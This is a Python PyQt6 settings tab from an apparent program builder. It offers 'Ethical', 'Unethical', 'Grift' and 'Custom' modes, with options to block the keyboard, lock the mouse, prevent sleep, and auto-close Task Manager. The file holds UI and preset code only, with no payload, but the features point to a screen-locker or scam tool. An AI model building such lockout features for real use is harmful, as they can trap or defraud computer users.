# builder/ui/security_mode_tab.py
"""
Security Mode Tab

This tab centralizes security settings. When 'Custom' mode is selected,
custom controls appear and update a live summary automatically.
Each custom control has a tooltip explaining its function.
Changes (via slider or custom controls) immediately update the live summary and emit a signal so that the main Security Header updates.
"""

import os
import json
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QSlider, QComboBox,
    QCheckBox, QPushButton, QFormLayout, QMessageBox, QInputDialog
)
from PyQt6.QtCore import Qt, pyqtSignal, pyqtSlot
from builder import security_settings
from builder.presets import list_presets, load_preset, save_preset

SECURITY_MODES = {
    0: "Ethical",
    1: "Unethical",
    2: "Grift",
    3: "Custom"
}

def generate_live_summary(settings: dict) -> str:
    lines = []
    lines.append(f"Mode: {settings.get('SECURITY_MODE', 'Ethical')}")
    lines.append(f"UI Keyboard: {settings.get('USE_UI_KEYBOARD', False)}")
    lines.append(f"Keyboard Blocker: {settings.get('KEYBOARD_BLOCKER_MODE', 0)}")
    lines.append(f"Mouse Locker: {settings.get('ENABLE_MOUSE_LOCKER', False)}")
    lines.append(f"Sleep Blocker: {settings.get('ENABLE_SLEEP_BLOCKER', False)}")
    lines.append(f"Security Monitor: {settings.get('ENABLE_SECURITY_MONITOR', False)}")
    lines.append(f"Close Button Disabled: {settings.get('CLOSE_BUTTON_DISABLED', False)}")
    lines.append(f"Logger: {settings.get('ENABLE_LOGGER', False)}")
    return "\n".join(lines)

class SecurityModeTab(QWidget):
    # Emits a dictionary with current security settings (including SECURITY_MODE).
    settingsChanged = pyqtSignal(dict)
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()
        self.load_existing_state()
    
    def init_ui(self):
        layout = QVBoxLayout(self)
        
        # Security Mode Slider.
        slider_layout = QHBoxLayout()
        slider_label = QLabel("Set Security Mode:")
        slider_layout.addWidget(slider_label)
        self.modeSlider = QSlider(Qt.Orientation.Horizontal)
        self.modeSlider.setRange(0, 3)
        self.modeSlider.setTickInterval(1)
        self.modeSlider.setTickPosition(QSlider.TickPosition.TicksBelow)
        self.modeSlider.setSingleStep(1)
        self.modeSlider.valueChanged.connect(self.on_slider_changed)
        slider_layout.addWidget(self.modeSlider)
        self.modeDisplay = QLabel(SECURITY_MODES[0])
        self.modeDisplay.setStyleSheet("font-weight: bold;")
        slider_layout.addWidget(self.modeDisplay)
        layout.addLayout(slider_layout)
        
        # Custom options container (for Custom mode).
        self.customContainer = QWidget()
        custom_form = QFormLayout(self.customContainer)
        self.custom_uiKeyboard = QCheckBox("Use UI Keyboard")
        self.custom_uiKeyboard.setToolTip("If enabled, an on-screen keyboard will appear for input.")
        self.custom_keyboard_blocker = QComboBox()
        self.custom_keyboard_blocker.addItem("Block All (Mode 1)", 1)
        self.custom_keyboard_blocker.addItem("Allow Typeable (Mode 2)", 2)
        self.custom_keyboard_blocker.setToolTip("Block All disables all keys; Allow Typeable permits basic typing.")
        self.custom_mouse_locker = QCheckBox("Enable Mouse Locker")
        self.custom_mouse_locker.setToolTip("Locks the mouse pointer to the application window.")
        self.custom_sleep_blocker = QCheckBox("Enable Sleep Blocker")
        self.custom_sleep_blocker.setToolTip("Prevents the system from sleeping while the app is active.")
        self.custom_security_monitor = QCheckBox("Enable Security Monitor")
        self.custom_security_monitor.setToolTip("activates a protocol that automatically closes task manager if opened")
        custom_form.addRow(self.custom_uiKeyboard)
        custom_form.addRow("Keyboard Blocker Mode:", self.custom_keyboard_blocker)
        custom_form.addRow(self.custom_mouse_locker)
        custom_form.addRow(self.custom_sleep_blocker)
        custom_form.addRow(self.custom_security_monitor)
        self.customContainer.setVisible(False)
        layout.addWidget(self.customContainer)
        
        # Live summary label.
        self.summaryLabel = QLabel("Security Summary will appear here")
        self.summaryLabel.setAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.summaryLabel.setStyleSheet("font-size: 14px; color: #cccccc;")
        layout.addWidget(self.summaryLabel)
        
        # Preset controls.
        preset_layout = QHBoxLayout()
        preset_layout.addWidget(QLabel("Preset:"))
        self.presetDropdown = QComboBox()
        self.refresh_presets_dropdown()
        preset_layout.addWidget(self.presetDropdown)
        self.loadPresetButton = QPushButton("Load Preset")
        self.loadPresetButton.clicked.connect(self.load_preset)
        preset_layout.addWidget(self.loadPresetButton)
        self.savePresetButton = QPushButton("Save Preset")
        self.savePresetButton.clicked.connect(self.save_preset)
        preset_layout.addWidget(self.savePresetButton)
        layout.addLayout(preset_layout)
        
        # Connect custom controls to update live summary.
        self.custom_uiKeyboard.stateChanged.connect(self.on_custom_control_changed)
        self.custom_keyboard_blocker.currentIndexChanged.connect(self.on_custom_control_changed)
        self.custom_mouse_locker.stateChanged.connect(self.on_custom_control_changed)
        self.custom_sleep_blocker.stateChanged.connect(self.on_custom_control_changed)
        self.custom_security_monitor.stateChanged.connect(self.on_custom_control_changed)
    
    def refresh_presets_dropdown(self):
        self.presetDropdown.clear()
        presets = list_presets("security")
        self.presetDropdown.addItems(presets)
    
    @pyqtSlot(int)
    def on_slider_changed(self, value):
        mode = SECURITY_MODES.get(value, "Ethical")
        self.modeDisplay.setText(mode)
        if mode == "Custom":
            self.customContainer.setVisible(True)
        else:
            self.customContainer.setVisible(False)
        self.update_live_summary()
        self.emit_settings_changed()
    
    @pyqtSlot()
    def on_custom_control_changed(self):
        self.update_live_summary()
        self.emit_settings_changed()
    
    def load_existing_state(self):
        config = security_settings.load_security_settings()
        mode = config.get("SECURITY_MODE", "Ethical")
        try:
            idx = list(SECURITY_MODES.values()).index(mode)
        except ValueError:
            idx = 0
        self.modeSlider.setValue(idx)
        if mode == "Custom":
            self.custom_uiKeyboard.setChecked(config.get("USE_UI_KEYBOARD", False))
            kb_mode = config.get("KEYBOARD_BLOCKER_MODE", 1)
            self.custom_keyboard_blocker.setCurrentIndex(0 if kb_mode == 1 else 1)
            self.custom_mouse_locker.setChecked(config.get("ENABLE_MOUSE_LOCKER", False))
            self.custom_sleep_blocker.setChecked(config.get("ENABLE_SLEEP_BLOCKER", False))
            self.custom_security_monitor.setChecked(config.get("ENABLE_SECURITY_MONITOR", False))
        self.update_live_summary()
    
    def update_live_summary(self):
        mode = SECURITY_MODES.get(self.modeSlider.value(), "Ethical")
        if mode == "Custom":
            current = {
                "SECURITY_MODE": mode,
                "USE_UI_KEYBOARD": self.custom_uiKeyboard.isChecked(),
                "KEYBOARD_BLOCKER_MODE": self.custom_keyboard_blocker.currentData(),
                "ENABLE_MOUSE_LOCKER": self.custom_mouse_locker.isChecked(),
                "ENABLE_SLEEP_BLOCKER": self.custom_sleep_blocker.isChecked(),
                "ENABLE_SECURITY_MONITOR": self.custom_security_monitor.isChecked(),
                "CLOSE_BUTTON_DISABLED": security_settings.load_security_settings().get("CLOSE_BUTTON_DISABLED", False),
                "ENABLE_LOGGER": security_settings.load_security_settings().get("ENABLE_LOGGER", False)
            }
        else:
            current = security_settings.load_security_settings()
            current["SECURITY_MODE"] = mode
        self.summaryLabel.setText(generate_live_summary(current))
    
    def emit_settings_changed(self):
        current_mode = SECURITY_MODES.get(self.modeSlider.value(), "Ethical")
        self.settingsChanged.emit({"SECURITY_MODE": current_mode})
    
    def load_preset(self):
        preset_name = self.presetDropdown.currentText()
        if not preset_name:
            QMessageBox.warning(self, "Warning", "No preset selected.")
            return
        preset_settings = load_preset("security", preset_name)
        if preset_settings:
            self.custom_uiKeyboard.setChecked(preset_settings.get("USE_UI_KEYBOARD", False))
            kb_mode = preset_settings.get("KEYBOARD_BLOCKER_MODE", 1)
            self.custom_keyboard_blocker.setCurrentIndex(0 if kb_mode == 1 else 1)
            self.custom_mouse_locker.setChecked(preset_settings.get("ENABLE_MOUSE_LOCKER", False))
            self.custom_sleep_blocker.setChecked(preset_settings.get("ENABLE_SLEEP_BLOCKER", False))
            self.custom_security_monitor.setChecked(preset_settings.get("ENABLE_SECURITY_MONITOR", False))
            QMessageBox.information(self, "Preset Loaded", f"Preset '{preset_name}' loaded successfully.")
            self.update_live_summary()
            self.emit_settings_changed()
        else:
            QMessageBox.warning(self, "Error", f"Failed to load preset '{preset_name}'.")
    
    def save_preset(self):
        mode = SECURITY_MODES.get(self.modeSlider.value(), "Ethical")
        if mode != "Custom":
            QMessageBox.warning(self, "Warning", "Presets can only be saved in Custom mode.")
            return
        preset_settings = {
            "SECURITY_MODE": mode,
            "USE_UI_KEYBOARD": self.custom_uiKeyboard.isChecked(),
            "KEYBOARD_BLOCKER_MODE": self.custom_keyboard_blocker.currentData(),
            "ENABLE_MOUSE_LOCKER": self.custom_mouse_locker.isChecked(),
            "ENABLE_SLEEP_BLOCKER": self.custom_sleep_blocker.isChecked(),
            "ENABLE_SECURITY_MONITOR": self.custom_security_monitor.isChecked()
        }
        if save_preset("security", preset_settings, parent_widget=self):
            QMessageBox.information(self, "Preset Saved", "Security preset saved successfully.")
            self.refresh_presets_dropdown()
